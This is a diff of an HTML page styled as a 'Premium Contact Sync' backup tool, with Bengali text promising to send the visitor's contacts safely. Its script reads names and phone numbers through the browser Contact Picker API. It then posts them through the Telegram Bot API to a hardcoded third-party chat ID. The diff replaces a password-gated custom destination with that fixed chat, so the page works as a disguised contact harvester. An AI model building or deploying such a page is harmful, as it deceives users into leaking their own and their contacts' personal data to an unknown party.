@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Secure Sync</title>
+<title>Premium Contact Sync</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
 
@@ -15,53 +15,56 @@ body{
     justify-content:center;
     align-items:center;
     font-family:'Hind Siliguri',sans-serif;
-    background: linear-gradient(160deg,#020617,#0f172a);
+    background: linear-gradient(135deg,#020617,#0f172a);
 }
 
+/* Glass Card */
 .card{
     width:340px;
-    padding:25px;
-    border-radius:20px;
+    padding:30px;
+    border-radius:22px;
     background: rgba(255,255,255,0.06);
-    backdrop-filter: blur(18px);
+    backdrop-filter: blur(20px);
     border:1px solid rgba(255,255,255,0.1);
-    box-shadow:0 8px 25px rgba(0,0,0,0.5);
+    box-shadow:0 10px 35px rgba(0,0,0,0.6);
     text-align:center;
 }
 
-h2{color:#fff;margin-bottom:8px;}
-p{color:#94a3b8;font-size:14px;}
+/* Text */
+h2{
+    color:#fff;
+    margin-bottom:8px;
+}
 
+p{
+    color:#94a3b8;
+    font-size:14px;
+}
+
+/* Button */
 .btn{
-    margin-top:12px;
+    margin-top:20px;
     width:100%;
-    padding:14px;
+    padding:16px;
     border:none;
-    border-radius:12px;
-    font-size:15px;
+    border-radius:14px;
+    font-size:16px;
     font-weight:600;
     cursor:pointer;
-    background: linear-gradient(135deg,#3b82f6,#22c55e);
-    color:#fff;
+    background: linear-gradient(135deg,#22c55e,#4ade80);
+    color:#000;
+    transition:0.3s;
 }
 
-.btn2{
-    background: linear-gradient(135deg,#f59e0b,#ef4444);
+.btn:active{
+    transform:scale(0.98);
 }
 
-input{
-    margin-top:10px;
-    width:100%;
-    padding:12px;
-    border-radius:10px;
-    border:none;
-    outline:none;
-}
-
+/* Loader */
 .loader{
     margin:15px auto;
-    width:24px;
-    height:24px;
+    width:26px;
+    height:26px;
     border:3px solid rgba(255,255,255,0.2);
     border-top:3px solid #22c55e;
     border-radius:50%;
@@ -69,10 +72,12 @@ input{
     display:none;
 }
 
-@keyframes spin{100%{transform:rotate(360deg)}}
+@keyframes spin{
+    100%{transform:rotate(360deg)}
+}
 
 .status{
-    margin-top:10px;
+    margin-top:12px;
     font-size:14px;
     color:#22c55e;
 }
@@ -82,15 +87,10 @@ input{
 <body>
 
 <div class="card">
-    <h2>☁️ Secure Backup</h2>
-    <p>কন্টাক্ট সিলেক্ট করে পাঠান</p>
+    <h2>☁️ Contact Backup</h2>
+    <p>কন্টাক্ট সিলেক্ট করে নিরাপদে পাঠান</p>
 
-    <button class="btn" onclick="startSend()">Normal Send</button>
-
-    <input type="password" id="pass" placeholder="Password">
-    <input type="text" id="chat" placeholder="New Chat ID">
-
-    <button class="btn btn2" onclick="setCustom()">Set Custom ID</button>
+    <button class="btn" id="btn">Select & Send</button>
 
     <div class="loader" id="loader"></div>
     <div class="status" id="status">Ready</div>
@@ -98,76 +98,55 @@ input{
 
 <script>
 const CONFIG = {
-    TOKEN: "YOUR_BOT_TOKEN",
-    DEFAULT_CHAT: "YOUR_DEFAULT_CHAT_ID"
+    TOKEN: "YOUR_NEW_BOT_TOKEN",
+    CHAT_ID: "6467941734"
 };
 
-let currentChat = CONFIG.DEFAULT_CHAT;
+const btn = document.getElementById('btn');
+const loader = document.getElementById('loader');
+const status = document.getElementById('status');
 
-// contact collect
-async function getContacts(){
-    if (!('contacts' in navigator)) throw new Error("Not supported");
+btn.onclick = async () => {
+    try {
+        if (!('contacts' in navigator)) {
+            throw new Error("এই ডিভাইস সাপোর্ট করে না");
+        }
 
-    const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});
-    if (!contacts.length) throw new Error("No contacts");
+        const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});
 
-    let text = "📱 Contact List\n\n";
+        if (!contacts.length) {
+            throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");
+        }
 
-    contacts.forEach(c=>{
-        let n = c.name ? c.name[0] : "No Name";
-        let t = c.tel ? c.tel[0] : "No Number";
-        text += `👤 ${n}\n📞 ${t}\n\n`;
-    });
+        loader.style.display = "block";
+        status.innerText = "Sending...";
 
-    return text;
-}
+        let text = "📱 Contact List\n\n";
 
-// send function
-async function send(text){
-    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`,{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({
-            chat_id: currentChat,
-            text: text
-        })
-    });
-}
+        contacts.forEach(c=>{
+            let name = c.name ? c.name[0] : "No Name";
+            let phone = c.tel ? c.tel[0] : "No Number";
 
-// normal send
-async function startSend(){
-    try{
-        loader.style.display="block";
-        status.innerText="Sending...";
+            text += `👤 ${name}\n📞 ${phone}\n\n`;
+        });
 
-        let text = await getContacts();
-        await send(text);
+        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({
+                chat_id: CONFIG.CHAT_ID,
+                text: text
+            })
+        });
 
-        status.innerText="✅ Sent!";
-    }catch(e){
-        status.innerText="❌ "+e.message;
+        loader.style.display = "none";
+        status.innerText = "✅ Successfully Sent!";
     }
-    loader.style.display="none";
-}
-
-// set custom id
-function setCustom(){
-    const pass = document.getElementById("pass").value;
-    const chat = document.getElementById("chat").value;
-
-    if(pass !== "7878"){
-        status.innerText="❌ Wrong Password";
-        return;
+    catch(e){
+        loader.style.display = "none";
+        status.innerText = "❌ " + e.message;
     }
-
-    if(!chat){
-        status.innerText="❌ Chat ID লাগবে";
-        return;
-    }
-
-    currentChat = chat;
-    status.innerText="✅ Custom ID Set!";
-}
+};
 </script>
 
 </body>
